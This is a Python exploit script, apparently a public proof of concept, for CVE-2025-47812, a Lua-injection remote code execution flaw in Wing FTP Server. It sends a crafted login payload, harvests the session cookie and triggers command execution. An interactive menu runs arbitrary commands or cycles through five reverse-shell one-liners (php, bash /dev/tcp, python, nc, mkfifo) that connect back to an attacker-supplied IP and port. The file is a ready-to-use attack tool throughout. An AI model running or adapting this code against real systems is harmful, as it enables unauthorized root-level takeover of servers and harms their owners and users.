import requests
import re
import time
from urllib.parse import quote

# === ANSI Color Codes ===
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# === Banner ===
def banner():
    print(CYAN + r"""
_____________   _______________         _______________   ________   .________            ______________  ______  ____________
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  |   ____/           /  |  \______  \/  __  \/_   \_____  \
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/  |____  \   ______  /   |  |_  /    />      < |   |/  ____/
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/ /    ^   / /    //   --   \|   /       \
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         \____   | /____/ \______  /|___\_______ \
        \/                  \/                  \/     \/         \/       \/               |__|               \/             \/
""" + RESET)
    print(MAGENTA + "                  [ by " + GREEN + "0xgh057r3c0n" + MAGENTA + " ]")
    print(YELLOW + "         CVE-2025-47812 | Wing FTP Server RCE via Lua Injection")
    print(YELLOW + "         Affects Wing FTP <= 7.4.3 | Root/SYSTEM privileges\n" + RESET)

# === Exploit Core ===
def run_exploit(target_url, command, username="anonymous", verbose=True):
    login_url = f"{target_url}/loginok.html"
    dir_url = f"{target_url}/dir.html"

    headers = {
        "Host": target_url.split('//')[1].split('/')[0],
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": target_url,
        "Connection": "keep-alive",
        "Referer": f"{target_url}/login.html",
        "Cookie": "client_lang=english",
        "Upgrade-Insecure-Requests": "1"
    }

    encoded_username = quote(username)
    payload = (
        f"username={encoded_username}%00]]%0dlocal+h+%3d+io.popen(\"{command}\")%0d"
        "local+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--&password="
    )

    if verbose:
        print(YELLOW + f"[*] Sending exploit to {login_url} with command: {command}")

    try:
        login_response = requests.post(login_url, headers=headers, data=payload, timeout=10)
        login_response.raise_for_status()
    except Exception as e:
        print(RED + f"[-] Login request failed: {e}")
        return None

    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)
    if not match:
        print(RED + "[-] UID not found. Exploit likely failed.")
        return None

    uid = match.group(1)
    if verbose:
        print(GREEN + f"[+] UID extracted: {uid}")

    dir_headers = {
        "Host": headers["Host"],
        "User-Agent": headers["User-Agent"],
        "Accept": headers["Accept"],
        "Accept-Language": headers["Accept-Language"],
        "Accept-Encoding": headers["Accept-Encoding"],
        "Connection": "keep-alive",
        "Cookie": f"UID={uid}",
        "Upgrade-Insecure-Requests": "1"
    }

    try:
        dir_response = requests.get(dir_url, headers=dir_headers, timeout=10)
        dir_response.raise_for_status()
    except Exception as e:
        print(RED + f"[-] /dir.html failed: {e}")
        return None

    output = re.split(r'<\?xml', dir_response.text)[0].strip()

    if output:
        print(GREEN + "\n--- Output ---")
        print(output)
        print(GREEN + "--------------\n")
    else:
        print(RED + "[-] No output or command failed.")

    return output

# === Interactive Tool ===
def main():
    banner()
    target = input(CYAN + "Target URL (e.g., http://192.168.1.100:5466): ").strip()
    username = input(CYAN + "Username [default: anonymous]: ").strip() or "anonymous"

    print(MAGENTA + "\n1) Run single command")
    print("2) Get reverse shell")
    choice = input(CYAN + "Your choice (1 or 2): ").strip()

    if choice == "1":
        command = input(CYAN + "Command to execute [default: whoami]: ").strip() or "whoami"
        run_exploit(target, command, username)

    elif choice == "2":
        ip = input(CYAN + "Attacker IP: ").strip()
        port = input(CYAN + "Attacker Port: ").strip()

        reverse_shells = [
            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"sh <&3 >&3 2>&3\");'",
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"nc {ip} {port} -e /bin/sh",
            f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
        ]

        for shell in reverse_shells:
            print(YELLOW + f"[*] Trying reverse shell: {shell}")
            result = run_exploit(target, shell, username, verbose=False)
            if result:
                print(GREEN + "[*] Payload likely succeeded. Check your listener.\n")
                time.sleep(2)
                break
            else:
                print(RED + "[-] Failed. Trying next...\n")

    else:
        print(RED + "[-] Invalid choice. Exiting.")

if __name__ == "__main__":
    main()